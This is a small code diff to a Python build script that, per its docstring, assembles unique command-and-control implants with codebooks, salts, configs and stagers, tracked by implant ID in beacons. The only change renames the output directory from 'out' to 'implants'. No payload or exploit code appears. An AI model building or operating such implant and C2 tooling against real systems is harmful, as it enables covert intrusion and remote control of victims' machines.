@@ -3,7 +3,7 @@
 Master pipeline: codebook → dataset → config → assemble → stager.
 This is the math-free version of the C4 Protocol using an Encrypted Vault.
 
-Each run produces a unique implant instance under out/<implant-id>/ with its
+Each run produces a unique implant instance under implants/<implant-id>/ with its
 own codebook, salt, config, and stager.  The C2 server uses the implant ID
 (received in beacons) to look up the correct directory for key/codebook lookup.
 """
@@ -257,7 +257,7 @@ def main() -> None:
     if args.seed is None:
         args.seed = full_uuid.int % (2**31)
 
-    instance_dir = DIR / "out" / implant_id
+    instance_dir = DIR / "implants" / implant_id
     instance_dir.mkdir(parents=True, exist_ok=True)
 
     steps_defs = _make_steps(instance_dir)
